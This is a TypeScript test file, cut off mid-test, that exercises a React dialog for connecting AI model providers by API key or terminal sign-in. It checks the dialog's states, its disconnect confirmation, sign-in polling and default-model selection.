import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { act, cleanup, fireEvent, render, screen, waitFor } from '@testing-library/react';
import {
  ipc,
  resetMockPiSetup,
  type PiConnectResult,
  type PiSetupStatus,
} from '../types/ipc';
import { useWorkspaceStore } from '../store/workspaceStore';
import { ProviderDialog } from '../components/providerDialog/ProviderDialog';

const PRIMARY_SELECTOR = '.btn-primary-xs, .btn-danger-xs';
const ENV_KEYS = ['OPENCODE_API_KEY', 'OPENROUTER_API_KEY', 'ANTHROPIC_API_KEY', 'OPENAI_API_KEY', 'GEMINI_API_KEY'];

function createMemoryStorage(): Storage & { snapshot: () => Record<string, string> } {
  const data = new Map<string, string>();
  return {
    get length() {
      return data.size;
    },
    clear: () => data.clear(),
    getItem: (key) => data.get(key) ?? null,
    key: (index) => [...data.keys()][index] ?? null,
    removeItem: (key) => {
      data.delete(key);
    },
    setItem: (key, value) => {
      data.set(key, String(value));
    },
    snapshot: () => Object.fromEntries(data),
  };
}

let storage: ReturnType<typeof createMemoryStorage>;

function resetStore(): void {
  useWorkspaceStore.setState({
    workspace: null,
    openTabs: [],
    dirtyFiles: [],
    oneShotAttachments: [],
    chatMessages: [],
    piSetupStatus: null,
    providerDialog: { open: false, preselect: null, hiddenForSignIn: false },
    providerSignIn: null,
    modelCatalog: null,
    modelCatalogLoading: false,
    modelCatalogError: null,
    pendingTerminalCommand: null,
    bottomCollapsed: true,
    rightCollapsed: false,
    isSendingChat: false,
    activeModalCount: 0,
  });
}

/** Seeds the in-memory pi mock by "configuring" providers, then mirrors the status into the store. */
async function seedStatus(
  providers: string[] = [],
  options: { firstRun?: boolean } = {}
): Promise<PiSetupStatus> {
  for (const provider of providers) {
    await ipc.piConfigureProvider({
      provider,
      api_key: `sk-test-${provider}`,
      mark_completed: options.firstRun === true ? false : true,
    });
  }
  const status = await ipc.piGetSetupStatus();
  useWorkspaceStore.setState({ piSetupStatus: status });
  return status;
}

async function seedCatalog(): Promise<void> {
  useWorkspaceStore.setState({ modelCatalog: await ipc.piListModels() });
}

function overrideStatus(patch: Partial<PiSetupStatus>): PiSetupStatus {
  const current = useWorkspaceStore.getState().piSetupStatus as PiSetupStatus;
  const status = { ...current, ...patch };
  useWorkspaceStore.setState({ piSetupStatus: status });
  return status;
}

function openDialog(preselect?: string): void {
  act(() => {
    useWorkspaceStore.getState().openProviderDialog(preselect);
  });
}

function renderDialog(): ReturnType<typeof render> {
  return render(<ProviderDialog />);
}

/**
 * Focus requests queued by `ModalDialog`. The tests stub `requestAnimationFrame` so the pending
 * callbacks can be captured and driven with `act`, without sleeping on real timers. Note that
 * `vi.useFakeTimers()` replaces this stub with the fake clock's own `requestAnimationFrame`, so
 * `flushFocus` also has to advance that clock; nothing here waits on the wall clock.
 */
const frameCallbacks = new Map<number, FrameRequestCallback>();
let nextFrameId = 1;

/** Runs the pending focus frame (fake or stubbed), then flushes the React work it triggers. */
async function flushFocus(): Promise<void> {
  await act(async () => {
    if (vi.isFakeTimers()) vi.advanceTimersToNextFrame();
    const pending = [...frameCallbacks.values()];
    frameCallbacks.clear();
    for (const callback of pending) callback(0);
    await Promise.resolve();
  });
}

function rowOption(label: string): HTMLElement {
  const option = screen
    .getAllByRole('option')
    .find((element) => element.querySelector('.provider-dialog-option-label')?.textContent === label);
  if (!option) throw new Error(`no provider row for ${label}`);
  return option;
}

function selectProvider(label: string): void {
  fireEvent.click(rowOption(label));
}

function keyInput(): HTMLInputElement {
  return screen.getByLabelText('API key') as HTMLInputElement;
}

function typeKey(value: string): void {
  fireEvent.change(keyInput(), { target: { value } });
}

/** The dialog is portal-rendered into `document.body`, outside the RTL container. */
function primaryCount(root: ParentNode = document.body): number {
  return root.querySelectorAll(PRIMARY_SELECTOR).length;
}

beforeEach(() => {
  storage = createMemoryStorage();
  vi.stubGlobal('localStorage', storage);
  frameCallbacks.clear();
  nextFrameId = 1;
  vi.stubGlobal('requestAnimationFrame', (callback: FrameRequestCallback) => {
    const id = nextFrameId++;
    frameCallbacks.set(id, callback);
    return id;
  });
  vi.stubGlobal('cancelAnimationFrame', (id: number) => {
    frameCallbacks.delete(id);
  });
  resetMockPiSetup();
  resetStore();
  document.body.innerHTML = '';
});

afterEach(() => {
  cleanup();
  act(() => {
    useWorkspaceStore.getState().cancelProviderSignIn();
  });
  vi.useRealTimers();
  vi.restoreAllMocks();
  vi.unstubAllGlobals();
  document.body.innerHTML = '';
});

describe('ProviderDialog visibility', () => {
  it('renders nothing while closed and hides itself for sign-in (S3-10)', async () => {
    await seedStatus(['opencode-go']);
    await seedCatalog();
    const { container } = renderDialog();
    expect(container.querySelector('[role="dialog"]')).toBeNull();

    openDialog();
    expect(screen.getByRole('dialog')).toBeTruthy();
    expect(useWorkspaceStore.getState().activeModalCount).toBe(1);

    act(() => {
      useWorkspaceStore.getState().startProviderSignIn('opencode-go');
    });
    expect(screen.queryByRole('dialog')).toBeNull();
    expect(useWorkspaceStore.getState().activeModalCount).toBe(0);

    act(() => {
      useWorkspaceStore.getState().revealProviderDialog();
    });
    expect(screen.getByRole('dialog')).toBeTruthy();
  });
});

describe('AC10 — exactly one primary action per state', () => {
  type Case = {
    label: string;
    footerPrimary: boolean;
    drive: () => Promise<void>;
  };

  const cases: Case[] = [
    {
      label: 'S-KEY',
      footerPrimary: false,
      drive: async () => {
        selectProvider('OpenRouter');
      },
    },
    {
      label: 'S-OAUTH',
      footerPrimary: false,
      drive: async () => {
        selectProvider('OpenAI Codex (ChatGPT OAuth)');
      },
    },
    {
      label: 'S-CONNECTING',
      footerPrimary: false,
      drive: async () => {
        selectProvider('OpenRouter');
        typeKey('sk-test-pending');
        vi.spyOn(ipc, 'piConnectProvider').mockImplementation(
          () => new Promise<PiConnectResult>(() => {})
        );
        await act(async () => {
          fireEvent.click(screen.getByRole('button', { name: 'Connect' }));
        });
      },
    },
    {
      label: 'S-WAITING',
      footerPrimary: false,
      drive: async () => {
        selectProvider('OpenRouter');
        fireEvent.click(screen.getByRole('button', { name: 'Sign in with browser instead' }));
        await act(async () => {
          fireEvent.click(screen.getByRole('button', { name: 'Sign in' }));
        });
        act(() => {
          useWorkspaceStore.getState().revealProviderDialog();
        });
        await flushFocus();
      },
    },
    {
      label: 'S-TIMEOUT',
      footerPrimary: false,
      drive: async () => {
        selectProvider('OpenRouter');
        act(() => {
          useWorkspaceStore.setState({
            providerSignIn: {
              provider: 'openrouter',
              phase: 'timeout',
              startedAt: Date.now(),
              detail: null,
            },
          });
        });
      },
    },
    {
      label: 'S-CONNECTED',
      footerPrimary: true,
      drive: async () => {},
    },
    {
      label: 'S-ENV',
      footerPrimary: true,
      drive: async () => {
        const base = useWorkspaceStore.getState().piSetupStatus as PiSetupStatus;
        act(() => {
          overrideStatus({
            configured_providers: [],
            provider_ready: true,
            active_provider: 'opencode-go',
            providers: base.providers.map((entry) =>
              entry.id === 'opencode-go' ? { ...entry, configured: false, auth_type: null } : entry
            ),
          });
        });
      },
    },
    {
      label: 'S-REPLACE',
      footerPrimary: false,
      drive: async () => {
        fireEvent.click(screen.getByRole('button', { name: 'Replace key' }));
      },
    },
    {
      label: 'S-CONFIRM',
      footerPrimary: false,
      drive: async () => {
        fireEvent.click(screen.getByRole('button', { name: 'Disconnect…' }));
      },
    },
    {
      label: 'S-DISCONNECTING',
      footerPrimary: false,
      drive: async () => {
        fireEvent.click(screen.getByRole('button', { name: 'Disconnect…' }));
        vi.spyOn(ipc, 'piLogoutProvider').mockImplementation(
          () => new Promise<PiSetupStatus>(() => {})
        );
        await act(async () => {
          fireEvent.click(screen.getByRole('button', { name: 'Disconnect' }));
        });
      },
    },
    {
      label: 'S-ERROR',
      footerPrimary: false,
      drive: async () => {
        selectProvider('OpenRouter');
        typeKey('invalid-x');
        await act(async () => {
          fireEvent.click(screen.getByRole('button', { name: 'Connect' }));
        });
        await waitFor(() => expect(screen.getByRole('alert')).toBeTruthy());
      },
    },
  ];

  it.each(cases)('$label renders exactly one primary', async (testCase) => {
    await seedStatus(['opencode-go']);
    await seedCatalog();
    openDialog();
    renderDialog();
    await flushFocus();

    await testCase.drive();

    expect(primaryCount()).toBe(1);
    const done = screen.getByRole('button', { name: 'Done' });
    expect(done.className.includes('btn-primary-xs')).toBe(testCase.footerPrimary);
  });
});

describe('AC12 — the key field never shows an environment variable', () => {
  it('uses the neutral placeholder and links the env helper through aria-describedby', async () => {
    const status = await seedStatus([]);
    await seedCatalog();
    openDialog();
    renderDialog();
    await flushFocus();

    const withKey = status.providers.filter((provider) => provider.supports_api_key);
    expect(withKey.length).toBeGreaterThan(0);

    for (const provider of withKey) {
      selectProvider(provider.label);
      const input = keyInput();
      expect(input.placeholder).toBe('Paste your API key');
      for (const envKey of ENV_KEYS) {
        expect(input.placeholder).not.toContain(envKey);
      }
      if (provider.env_var_hint) {
        const describedBy = input.getAttribute('aria-describedby');
        expect(describedBy).toBeTruthy();
        expect(document.getElementById(describedBy as string)?.textContent).toContain(
          provider.env_var_hint
        );
      }
    }
  });

  it('drops the helper reference while connecting hides it', async () => {
    await seedStatus([]);
    await seedCatalog();
    openDialog('openrouter');
    renderDialog();
    await flushFocus();
    typeKey('sk-test-connecting');

    vi.spyOn(ipc, 'piConnectProvider').mockImplementation(
      () => new Promise<PiConnectResult>(() => {})
    );
    await act(async () => {
      fireEvent.click(screen.getByRole('button', { name: 'Connect' }));
    });

    const input = keyInput();
    expect(input.disabled).toBe(true);
    expect(document.getElementById('provider-dialog-env-helper')).toBeNull();
    expect(input.getAttribute('aria-describedby')).toBeNull();
  });
});

describe('AC11 — guarded disconnect', () => {
  async function seedTwoProviders(): Promise<void> {
    await seedStatus(['opencode-go', 'openrouter']);
    await seedCatalog();
    const current = useWorkspaceStore.getState().piSetupStatus as PiSetupStatus;
    expect(current.active_provider).toBe('openrouter');
  }

  it('names the fallback default and makes no call on Cancel or Esc', async () => {
    await seedTwoProviders();
    openDialog('openrouter');
    renderDialog();
    await flushFocus();

    const logoutSpy = vi.spyOn(ipc, 'piLogoutProvider');

    fireEvent.click(screen.getByRole('button', { name: 'Disconnect…' }));
    const box = screen.getByRole('alertdialog');
    expect(box.textContent).toContain('Chat will switch to');
    expect(box.textContent).toContain('OpenCode Go');

    fireEvent.click(screen.getByRole('button', { name: 'Cancel' }));
    expect(screen.queryByRole('alertdialog')).toBeNull();
    expect(logoutSpy).not.toHaveBeenCalled();

    fireEvent.click(screen.getByRole('button', { name: 'Disconnect…' }));
    fireEvent.keyDown(screen.getByRole('alertdialog'), { key: 'Escape' });
    expect(screen.queryByRole('alertdialog')).toBeNull();
    expect(screen.getByRole('dialog')).toBeTruthy();
    expect(logoutSpy).not.toHaveBeenCalled();
  });

  it('disconnects once after confirmation', async () => {
    await seedTwoProviders();
    openDialog('openrouter');
    renderDialog();
    await flushFocus();

    const logoutSpy = vi.spyOn(ipc, 'piLogoutProvider');
    fireEvent.click(screen.getByRole('button', { name: 'Disconnect…' }));
    await act(async () => {
      fireEvent.click(screen.getByRole('button', { name: 'Disconnect' }));
    });

    await waitFor(() => expect(logoutSpy).toHaveBeenCalledTimes(1));
    expect(logoutSpy).toHaveBeenCalledWith('openrouter');
    expect(screen.getByRole('status').textContent).toContain('disconnected');
  });

  it('keeps the still-usable-via-env note when the default changes too (§4.5)', async () => {
    await seedTwoProviders();
    openDialog('openrouter');
    renderDialog();
    await flushFocus();

    // pi still finds a credential through the env var after the logout.
    vi.spyOn(ipc, 'piCheckProvider').mockResolvedValue({
      status: 'ready',
      provider: 'openrouter',
      auth_type: 'api_key',
      reason: null,
    });

    fireEvent.click(screen.getByRole('button', { name: 'Disconnect…' }));
    await act(async () => {
      fireEvent.click(screen.getByRole('button', { name: 'Disconnect' }));
    });

    await waitFor(() =>
      expect(screen.getByRole('status').textContent).toContain('OPENROUTER_API_KEY')
    );
    const note = screen.getByRole('status').textContent ?? '';
    expect(note).toContain('OpenRouter is still available through');
    expect(note).toContain('Default model is now');
  });
});

describe('focus helper', () => {
  it('applies the dialog initial focus under fake timers', async () => {
    vi.useFakeTimers();
    await seedStatus([]);
    await seedCatalog();
    openDialog('openrouter');
    renderDialog();
    expect(document.activeElement).toBe(document.body);

    await flushFocus();

    const dialog = screen.getByRole('dialog');
    expect(document.activeElement).not.toBe(document.body);
    expect(dialog.contains(document.activeElement)).toBe(true);
  });
});

describe('AC13 — OAuth auto-poll from the UI', () => {
  it('hides the dialog, then shows S-CONNECTED with focus on the heading once the check is ready', async () => {
    vi.useFakeTimers();
    await seedStatus([]);
    await seedCatalog();
    openDialog('openai-codex');
    renderDialog();
    await flushFocus();

    await act(async () => {
      fireEvent.click(screen.getByRole('button', { name: 'Sign in' }));
    });
    expect(screen.queryByRole('dialog')).toBeNull();
    expect(useWorkspaceStore.getState().providerDialog.hiddenForSignIn).toBe(true);

    // pi reports the provider connected after the terminal login.
    await ipc.piConfigureProvider({ provider: 'openai-codex', api_key: 'sk-test-oauth', mark_completed: true });

    await act(async () => {
      await vi.advanceTimersByTimeAsync(3000);
    });
    await flushFocus();

    expect(useWorkspaceStore.getState().providerDialog.hiddenForSignIn).toBe(false);
    expect(screen.getByRole('dialog')).toBeTruthy();
    const heading = screen.getByRole('heading', { name: /Connected with API key/ });
    expect(document.activeElement).toBe(heading);
  });

  it('Cancel sign-in returns to S-OAUTH and stops every check', async () => {
    vi.useFakeTimers();
    await seedStatus([]);
    await seedCatalog();
    openDialog('openai-codex');
    renderDialog();
    await flushFocus();

    await act(async () => {
      fireEvent.click(screen.getByRole('button', { name: 'Sign in' }));
    });
    act(() => {
      useWorkspaceStore.getState().revealProviderDialog();
    });
    await flushFocus();
    expect(screen.getByRole('button', { name: 'Cancel sign-in' })).toBeTruthy();

    const checkSpy = vi.spyOn(ipc, 'piCheckProvider');
    fireEvent.click(screen.getByRole('button', { name: 'Cancel sign-in' }));

    expect(screen.getByRole('button', { name: 'Sign in' })).toBeTruthy();
    expect(useWorkspaceStore.getState().providerSignIn).toBeNull();

    await act(async () => {
      await vi.advanceTimersByTimeAsync(10_000);
    });
    expect(checkSpy).not.toHaveBeenCalled();
  });

  it('selecting another provider while S-WAITING stops the poll and asks nothing', async () => {
    vi.useFakeTimers();
    await seedStatus([]);
    await seedCatalog();
    openDialog('openrouter');
    renderDialog();
    await flushFocus();

    fireEvent.click(screen.getByRole('button', { name: 'Sign in with browser instead' }));
    await act(async () => {
      fireEvent.click(screen.getByRole('button', { name: 'Sign in' }));
    });
    act(() => {
      useWorkspaceStore.getState().revealProviderDialog();
    });
    await flushFocus();

    const checkSpy = vi.spyOn(ipc, 'piCheckProvider');
    const logoutSpy = vi.spyOn(ipc, 'piLogoutProvider');
    const configureSpy = vi.spyOn(ipc, 'piConfigureProvider');

    selectProvider('OpenAI');

    expect(useWorkspaceStore.getState().providerSignIn).toBeNull();
    await act(async () => {
      await vi.advanceTimersByTimeAsync(10_000);
    });
    expect(checkSpy).not.toHaveBeenCalled();
    expect(logoutSpy).not.toHaveBeenCalled();
    expect(configureSpy).not.toHaveBeenCalled();
  });
});

describe('I1 — invalid and failed sign-in checks are shown to the user', () => {
  it('shows errInvalid with the reason and Sign in as the primary', async () => {
    await seedStatus([]);
    await seedCatalog();
    openDialog('openai-codex');
    renderDialog();
    await flushFocus();

    act(() => {
      useWorkspaceStore.setState({
        providerSignIn: {
          provider: 'openai-codex',
          phase: 'invalid',
          startedAt: Date.now(),
          detail: 'token expired',
        },
      });
    });

    await waitFor(() => expect(screen.getByRole('alert').textContent).toContain('token expired'));
    expect(screen.getByRole('alert').textContent).toContain('invalid');
    const signIn = screen.getByRole('button', { name: 'Sign in' });
    expect(signIn.className.includes('btn-primary-xs')).toBe(true);
  });

  it('shows errGeneric and Check again as the primary after three rejected checks', async () => {
    await seedStatus([]);
    await seedCatalog();
    openDialog('openai-codex');
    renderDialog();
    await flushFocus();

    act(() => {
      useWorkspaceStore.setState({
        providerSignIn: {
          provider: 'openai-codex',
          phase: 'error',
          startedAt: Date.now(),
          detail: 'ipc exploded',
        },
      });
    });

    await waitFor(() =>
      expect(screen.getByRole('alert').textContent).toContain('Something went wrong: ipc exploded')
    );
    const checkAgain = screen.getByRole('button', { name: 'Check again' });
    expect(checkAgain.className.includes('btn-primary-xs')).toBe(true);
    expect(screen.queryByRole('button', { name: 'Sign in' })).toBeNull();
  });

  it('signInInvalid: Use an API key instead cancels the finished sign-in and shows the key field', async () => {
    await seedStatus([]);
    await seedCatalog();
    openDialog('openrouter');
    renderDialog();
    await flushFocus();

    act(() => {
      useWorkspaceStore.setState({
        providerSignIn: {
          provider: 'openrouter',
          phase: 'invalid',
          startedAt: Date.now(),
          detail: 'token expired',
        },
      });
    });

    await waitFor(() => expect(screen.getByRole('alert').textContent).toContain('token expired'));
    fireEvent.click(screen.getByRole('button', { name: 'Use an API key instead' }));

    expect(useWorkspaceStore.getState().providerSignIn).toBeNull();
    expect(screen.getByLabelText('API key')).toBeTruthy();
    const connect = screen.getByRole('button', { name: 'Connect' });
    expect(connect.className.includes('btn-primary-xs')).toBe(true);
    expect(screen.queryByRole('alert')).toBeNull();
  });

  it('signInError: closing and reopening the dialog does not bring the stale error back', async () => {
    await seedStatus([]);
    await seedCatalog();
    openDialog('openrouter');
    renderDialog();
    await flushFocus();

    act(() => {
      useWorkspaceStore.setState({
        providerSignIn: {
          provider: 'openrouter',
          phase: 'error',
          startedAt: Date.now(),
          detail: 'ipc exploded',
        },
      });
    });

    await waitFor(() =>
      expect(screen.getByRole('alert').textContent).toContain('Something went wrong: ipc exploded')
    );
    fireEvent.click(screen.getByRole('button', { name: 'Close' }));
    expect(useWorkspaceStore.getState().providerSignIn).toBeNull();

    openDialog('openrouter');
    await flushFocus();

    expect(screen.getByLabelText('API key')).toBeTruthy();
    expect(screen.queryByRole('alert')).toBeNull();
  });
});

describe('I2 — Show terminal and Open the terminal again', () => {
  it('Show terminal only reveals the terminal: no command is retyped and the modal is hidden', async () => {
    vi.useFakeTimers();
    await seedStatus([]);
    await seedCatalog();
    openDialog('openrouter');
    renderDialog();
    await flushFocus();

    fireEvent.click(screen.getByRole('button', { name: 'Sign in with browser instead' }));
    await act(async () => {
      fireEvent.click(screen.getByRole('button', { name: 'Sign in' }));
    });
    expect(useWorkspaceStore.getState().consumePendingTerminalCommand()).toBe(
      'pi auth login openrouter\r'
    );

    act(() => {
      useWorkspaceStore.getState().revealProviderDialog();
    });
    await flushFocus();

    fireEvent.click(screen.getByRole('button', { name: 'Show terminal' }));

    const st = useWorkspaceStore.getState();
    expect(st.pendingTerminalCommand).toBeNull();
    expect(st.providerDialog.hiddenForSignIn).toBe(true);
    expect(st.bottomCollapsed).toBe(false);
    expect(screen.queryByRole('dialog')).toBeNull();
  });

  it('Open the terminal again re-runs the login, hides the dialog and restarts the poll', async () => {
    vi.useFakeTimers();
    await seedStatus([]);
    await seedCatalog();
    openDialog('openrouter');
    renderDialog();
    await flushFocus();

    act(() => {
      useWorkspaceStore.setState({
        providerSignIn: {
          provider: 'openrouter',
          phase: 'timeout',
          startedAt: Date.now(),
          detail: null,
        },
      });
    });

    const checkSpy = vi.spyOn(ipc, 'piCheckProvider').mockResolvedValue({
      status: 'not_ready',
      provider: 'openrouter',
      auth_type: null,
      reason: null,
    });

    await act(async () => {
      fireEvent.click(screen.getByRole('button', { name: 'Open the terminal again' }));
    });

    let st = useWorkspaceStore.getState();
    expect(st.pendingTerminalCommand).toBe('pi auth login openrouter\r');
    expect(st.providerDialog.hiddenForSignIn).toBe(true);
    expect(st.providerSignIn?.phase).toBe('waiting');

    await act(async () => {
      await vi.advanceTimersByTimeAsync(3000);
    });
    expect(checkSpy).toHaveBeenCalledTimes(1);
  });
});

describe('B1 — a manual re-sign-in never falls back to the auto-poll', () => {
  async function seedOAuthProvider(): Promise<void> {
    await seedStatus(['opencode-go']);
    const base = useWorkspaceStore.getState().piSetupStatus as PiSetupStatus;
    overrideStatus({
      providers: base.providers.map((entry) =>
        entry.id === 'opencode-go' ? { ...entry, auth_type: 'oauth' } : entry
      ),
    });
    await seedCatalog();
  }

  it('Open the terminal again after a failed manual check keeps the manual flow', async () => {
    vi.useFakeTimers();
    await seedOAuthProvider();
    openDialog('opencode-go');
    renderDialog();
    await flushFocus();

    const checkSpy = vi
      .spyOn(ipc, 'piCheckProvider')
      .mockRejectedValue(new Error('ipc down'));
    const listSpy = vi.spyOn(ipc, 'piListModels');

    await act(async () => {
      fireEvent.click(screen.getByRole('button', { name: 'Sign in again' }));
    });
    expect(useWorkspaceStore.getState().consumePendingTerminalCommand()).toBe(
      'pi auth login opencode-go\r'
    );

    act(() => {
      useWorkspaceStore.getState().revealProviderDialog();
    });
    await flushFocus();

    await act(async () => {
      fireEvent.click(screen.getByRole('button', { name: "I've signed in — check now" }));
    });
    await act(async () => {
      await vi.advanceTimersByTimeAsync(0);
    });
    expect(screen.getByRole('alert').textContent).toContain('ipc down');

    checkSpy.mockClear();
    await act(async () => {
      fireEvent.click(screen.getByRole('button', { name: 'Open the terminal again' }));
    });

    const st = useWorkspaceStore.getState();
    expect(st.pendingTerminalCommand).toBe('pi auth login opencode-go\r');
    expect(st.providerDialog.hiddenForSignIn).toBe(true);
    expect(st.providerSignIn?.phase).toBe('waiting');

    // Restarting the login on an already-connected provider must not resume the auto-poll: the
    // old stored credential would answer `ready` before the new login finishes.
    await act(async () => {
      await vi.advanceTimersByTimeAsync(130_000);
    });
    expect(checkSpy).not.toHaveBeenCalled();
    expect(listSpy).not.toHaveBeenCalled();
  });

  it('Sign in after invalid on an already connected provider keeps the manual flow', async () => {
    vi.useFakeTimers();
    await seedOAuthProvider();
    openDialog('opencode-go');
    renderDialog();
    await flushFocus();

    act(() => {
      useWorkspaceStore.setState({
        providerSignIn: {
          provider: 'opencode-go',
          phase: 'invalid',
          startedAt: Date.now(),
          detail: 'token expired',
        },
      });
    });
    await act(async () => {
      await vi.advanceTimersByTimeAsync(0);
    });
    expect(screen.getByRole('alert').textContent).toContain('token expired');

    const checkSpy = vi.spyOn(ipc, 'piCheckProvider').mockResolvedValue({
      status: 'ready',
      provider: 'opencode-go',
      auth_type: 'oauth',
      reason: null,
    });
    const listSpy = vi.spyOn(ipc, 'piListModels');

    await act(async () => {
      fireEvent.click(screen.getByRole('button', { name: 'Sign in' }));
    });

    let st = useWorkspaceStore.getState();
    expect(st.consumePendingTerminalCommand()).toBe('pi auth login opencode-go\r');
    expect(st.providerDialog.hiddenForSignIn).toBe(true);
    expect(st.providerSignIn?.phase).toBe('waiting');

    await act(async () => {
      await vi.advanceTimersByTimeAsync(130_000);
    });
    expect(checkSpy).not.toHaveBeenCalled();

    // A manual confirmation still refetches the catalog once the new login is ready.
    act(() => {
      useWorkspaceStore.getState().revealProviderDialog();
    });
    await flushFocus();
    await act(async () => {
      fireEvent.click(screen.getByRole('button', { name: "I've signed in — check now" }));
    });
    await act(async () => {
      await vi.advanceTimersByTimeAsync(0);
    });
    await flushFocus();

    st = useWorkspaceStore.getState();
    expect(checkSpy).toHaveBeenCalledTimes(1);
    expect(listSpy).toHaveBeenCalledTimes(1);
    expect(st.providerSignIn).toBeNull();
  });
});

describe('N5 — not_ready and check_error are connected with a warning', () => {
  async function connectWithOutcome(
    outcome: 'not_ready' | 'check_error'
  ): Promise<void> {
    await seedStatus([]);
    await seedCatalog();
    const base = useWorkspaceStore.getState().piSetupStatus as PiSetupStatus;
    const status: PiSetupStatus = {
      ...base,
      configured_providers: ['openrouter'],
      providers: base.providers.map((provider) =>
        provider.id === 'openrouter'
          ? { ...provider, configured: true, auth_type: 'api_key' }
          : provider
      ),
    };
    vi.spyOn(ipc, 'piConnectProvider').mockResolvedValue({
      status,
      check:
        outcome === 'not_ready'
          ? {
              status: 'not_ready',
              provider: 'openrouter',
              auth_type: null,
              reason: 'expired_key',
            }
          : null,
      check_error: outcome === 'check_error' ? 'could not verify the key' : null,
    });
    // The backend keeps the key, so the status after the initial-default configure must keep
    // OpenRouter connected even though the mock configure has no `api_key` in this request.
    const realConfigure = ipc.piConfigureProvider.bind(ipc);
    vi.spyOn(ipc, 'piConfigureProvider').mockImplementation(async (req) => {
      const next = await realConfigure(req);
      return {
        ...next,
        configured_providers: ['openrouter'],
        providers: next.providers.map((provider) =>
          provider.id === 'openrouter'
            ? { ...provider, configured: true, auth_type: 'api_key' }
            : provider
        ),
        provider_ready: true,
        first_run_completed: true,
        needs_setup: false,
        active_provider: 'openrouter',
      };
    });

    openDialog('openrouter');
    renderDialog();
    await flushFocus();
    typeKey('sk-test-saved');
    await act(async () => {
      fireEvent.click(screen.getByRole('button', { name: 'Connect' }));
    });

    await waitFor(() =>
      expect(screen.getByRole('heading', { name: /Connected with API key/ })).toBeTruthy()
    );
    expect(screen.queryByRole('alert')).toBeNull();
    expect(screen.queryByLabelText('API key')).toBeNull();
  }

  it('not_ready keeps the key and shows errNotReady as a note', async () => {
    await connectWithOutcome('not_ready');
    expect(document.querySelector('.provider-dialog-note')?.textContent).toContain(
      "pi can't use OpenRouter yet (expired_key)."
    );
  });

  it('check_error keeps the key and shows savedUnchecked as a note', async () => {
    await connectWithOutcome('check_error');
    expect(document.querySelector('.provider-dialog-note')?.textContent).toContain("pi wasn't found");
  });
});

describe('N3 — the default-change note keeps the provider when the model is null', () => {
  it('shows Default model is now <slug> for a custom provider with no known model', async () => {
    await seedStatus([]);
    await seedCatalog();
    openDialog();
    renderDialog();
    await flushFocus();

    fireEvent.click(rowOption('Other provider (slug)…'));
    fireEvent.change(screen.getByLabelText('Provider slug'), { target: { value: 'mystery' } });
    typeKey('sk-test-mystery');

    await act(async () => {
      fireEvent.click(screen.getByRole('button', { name: 'Connect' }));
    });

    await waitFor(() =>
      expect(screen.getByRole('status').textContent).toContain('Default model is now mystery.')
    );
  });
});

describe('N6 — Done completes the setup without an active model', () => {
  it('saves a null model for the env-only provider and closes', async () => {
    await seedStatus([], { firstRun: true });
    const base = useWorkspaceStore.getState().piSetupStatus as PiSetupStatus;
    overrideStatus({
      first_run_completed: false,
      provider_ready: true,
      active_provider: 'opencode-go',
      active_model: null,
      configured_providers: [],
      providers: base.providers.map((provider) =>
        provider.id === 'opencode-go'
          ? { ...provider, configured: false, auth_type: null }
          : provider
      ),
    });
    await seedCatalog();
    openDialog('opencode-go');
    renderDialog();
    await flushFocus();

    const configureSpy = vi.spyOn(ipc, 'piConfigureProvider');
    await act(async () => {
      fireEvent.click(screen.getByRole('button', { name: 'Done' }));
    });

    await waitFor(() => expect(useWorkspaceStore.getState().providerDialog.open).toBe(false));
    expect(configureSpy).toHaveBeenCalledWith({
      provider: 'opencode-go',
      model: null,
      mark_completed: true,
    });
  });
});

describe('N7 — disconnecting a non-curated provider keeps a meaningful selection', () => {
  it('switches to Other with the disconnected slug instead of selecting the first row', async () => {
    const seeded = await seedStatus(['mystery']);
    // A slug from auth.json is not in the curated `providers`; it only appears through
    // `configured_providers`, so after logout its row disappears.
    overrideStatus({ providers: seeded.providers.filter((provider) => provider.id !== 'mystery') });
    await seedCatalog();
    openDialog('mystery');
    renderDialog();
    await flushFocus();
    expect(rowOption('mystery').getAttribute('aria-selected')).toBe('true');

    vi.spyOn(ipc, 'piLogoutProvider').mockImplementation(async (provider) => {
      const current = useWorkspaceStore.getState().piSetupStatus as PiSetupStatus;
      return {
        ...current,
        configured_providers: current.configured_providers.filter((id) => id !== provider),
        providers: current.providers.filter((entry) => entry.id !== provider),
        provider_ready: false,
        needs_setup: true,
      };
    });

    fireEvent.click(screen.getByRole('button', { name: 'Disconnect…' }));
    await act(async () => {
      fireEvent.click(screen.getByRole('button', { name: 'Disconnect' }));
    });

    await waitFor(() =>
      expect((screen.getByLabelText('Provider slug') as HTMLInputElement).value).toBe('mystery')
    );
    expect(rowOption('Other provider (slug)…').getAttribute('aria-selected')).toBe('true');
    expect(screen.getByRole('status').textContent).toContain('mystery disconnected.');
  });
});

describe('S3-3 — the default model is decoupled from the selected provider', () => {
  it("picking another connected provider's model stages the default but keeps the row", async () => {
    await seedStatus(['opencode-go', 'openrouter']);
    await seedCatalog();
    openDialog('opencode-go');
    renderDialog();
    await flushFocus();

    expect(rowOption('OpenCode Go').getAttribute('aria-selected')).toBe('true');

    fireEvent.click(screen.getByRole('button', { name: /Default model/i }));
    fireEvent.click(screen.getByRole('option', { name: /deepseek\/deepseek-chat/ }));

    expect(screen.getByRole('button', { name: /Default model/i }).textContent).toContain(
      'deepseek/deepseek-chat'
    );
    expect(rowOption('OpenCode Go').getAttribute('aria-selected')).toBe('true');
    expect(rowOption('OpenRouter').getAttribute('aria-selected')).toBe('false');
  });
});

describe('footer Done', () => {
  it('saves a changed staged default and closes', async () => {
    await seedStatus(['opencode-go', 'openrouter']);
    await seedCatalog();
    openDialog('opencode-go');
    renderDialog();
    await flushFocus();

    fireEvent.click(screen.getByRole('button', { name: /Default model/i }));
    fireEvent.click(screen.getByRole('option', { name: /deepseek\/deepseek-chat/ }));

    const configureSpy = vi.spyOn(ipc, 'piConfigureProvider');
    await act(async () => {
      fireEvent.click(screen.getByRole('button', { name: 'Done' }));
    });

    await waitFor(() => expect(useWorkspaceStore.getState().providerDialog.open).toBe(false));
    expect(configureSpy).toHaveBeenCalledWith({
      provider: 'openrouter',
      model: 'deepseek/deepseek-chat',
      mark_completed: true,
    });
  });

  it('done with an unsaved key connects first and stays open on invalid', async () => {
    await seedStatus([]);
    await seedCatalog();
    openDialog();
    renderDialog();
    await flushFocus();

    selectProvider('OpenRouter');
    typeKey('invalid-x');
    const configureSpy = vi.spyOn(ipc, 'piConfigureProvider');
    const connectSpy = vi.spyOn(ipc, 'piConnectProvider');

    await act(async () => {
      fireEvent.click(screen.getByRole('button', { name: 'Done' }));
    });

